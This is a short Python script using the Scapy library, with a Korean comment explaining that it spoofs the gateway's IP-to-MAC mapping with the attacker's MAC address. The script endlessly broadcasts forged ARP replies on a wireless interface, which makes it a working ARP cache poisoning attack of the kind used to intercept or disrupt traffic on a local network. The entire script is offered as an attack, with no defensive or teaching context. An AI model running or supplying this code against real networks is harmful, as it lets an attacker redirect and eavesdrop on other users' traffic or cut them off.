from scapy.all import *
iface2 = 'wlan1'

# pdst는 브로드캐스트 주소, hwsrc는 공격자의 맥어드레스, psrc는 해당 IP에 해당하는 맥주소를 나로 속이는 것.
ssdpRequest=Ether(dst="ff:ff:ff:ff:ff:ff", type=2054)/ARP(hwdst='00:00:00:00:00:00', pdst='192.168.255.255', ptype=2048, hwtype=1, hwlen=6, plen=4, hwsrc='04:8d:38:03:0e:38', psrc='192.168.25.1', op=2)


sendp(ssdpRequest, iface=iface2,loop=1, inter=0.5)
